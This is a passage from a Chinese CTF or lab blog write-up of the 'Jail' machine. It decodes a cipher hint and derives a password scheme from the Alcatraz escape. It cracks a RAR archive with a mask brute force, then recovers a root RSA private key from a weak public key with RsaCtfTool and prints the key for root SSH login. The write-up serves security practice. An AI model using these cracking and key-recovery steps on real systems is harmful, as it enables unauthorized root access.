+<pre class="line-numbers language-bash"><code class="language-bash">Szszsz<span class="token operator">!</span> Mlylwb droo tfvhh nb mvd kzhhdliw<span class="token operator">!</span> Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
+
+<span class="token comment" spellcheck="true">#这个纯经验，没见过这个加密方式就解不了</span>
+解密网站：https://www.quipqiup.com/
+解密结果：
+Hahaha<span class="token operator">!</span> Nobody will guess my new password<span class="token operator">!</span> Only a few lucky souls have Escaped from Alcatraz alive like I did<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
+
+关键信息：alcatraz 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>keys.rar是压缩包(可以base64传出来解压看)</p>
+<pre class="line-numbers language-bash"><code class="language-bash">└─<span class="token comment" spellcheck="true"># file keys.rar</span>
+keys.rar: RAR archive data, v4, os: Unix
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>打开可以看到是root的公钥文件，但是需要密码</p>
+<p><img src="/2022/08/22/Jail/image/image_gEZiYU5O5N.png"></p>
+<p>结合<code>note.txt</code>和<code>.frank </code>，给出的信息和密码有关</p>
+<pre class="line-numbers language-bash"><code class="language-bash">密码是：Frank的姓氏+4位数字+1个符号
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><code>Frank</code>(弗兰克)的姓氏结合<code>alcatraz</code>(恶魔岛)和题目名<code>jail</code>可以社工到这个人<code>Frank Morris</code></p>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt">https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt</a></p>
+<p>越狱事件是1962年，所以得到一个接近的密码</p>
+<pre class="line-numbers language-bash"><code class="language-bash">Morris1962 + 1个符号
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>还差一个符号，可以爆破了</p>
+<p>使用工具<code>archpr</code>，掩码是<code>Morris1962?</code></p>
+<p><img src="/2022/08/22/Jail/image/image_S9ueMdrO3K.png"></p>
+<p>得到密码<code>Morris1962!</code></p>
+<p><img src="/2022/08/22/Jail/image/image_Jr0TypfyyZ.png"></p>
+<p>解压得到rootauthorizedsshkey.pub</p>
+<pre class="line-numbers language-bash"><code class="language-bash">-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
+YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
+DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
+D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
+Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
+I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
+a99GCw<span class="token operator">==</span>
+-----END PUBLIC KEY-----
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="恢复root公钥"><a href="#恢复root公钥" class="headerlink" title="恢复root公钥"></a>恢复root公钥</h4><p>RsaCtfTool这个工具可以将弱公钥恢复成私钥</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/RsaCtfTool/RsaCtfTool">https://github.com/RsaCtfTool/RsaCtfTool</a></p>
+<p>安装这个工具的依赖</p>
+<pre class="line-numbers language-bash"><code class="language-bash">
+<span class="token function">git</span> clone https://github.com/RsaCtfTool/RsaCtfTool
+<span class="token comment" spellcheck="true">#mpfr</span>
+<span class="token function">wget</span> https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.bz2
+<span class="token function">tar</span> -jxvf mpfr-4.1.0.tar.bz2 <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> mpfr-4.1.0
+./configure
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> check <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
+<span class="token comment" spellcheck="true">#mpc</span>
+<span class="token function">wget</span> ftp://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz
+<span class="token function">tar</span> -zxvf mpc-1.1.0.tar.gz <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> mpc-1.1.0
+./configure
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> check <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
+
+<span class="token function">cd</span> RsaCtfTool
+python3 -m pip <span class="token function">install</span> -r requirements.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python3 ./RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_qOxrDlI9dg.png"></p>
+<p>得到root私钥，保存位<code>jail-root</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
+MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
+CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
+9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
+7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
+FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
+m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
+PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
+XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
+NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
+bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
+6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
+hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q<span class="token operator">==</span>
+-----END RSA PRIVATE KEY-----
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>设置权限</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 ./jail-root
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获得root权限</p>
+<p><img src="/2022/08/22/Jail/image/image_gq5TCuy6yo.png"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaiasec'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/08/22/Jail/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/08/22/Jail/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//kaiasec.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
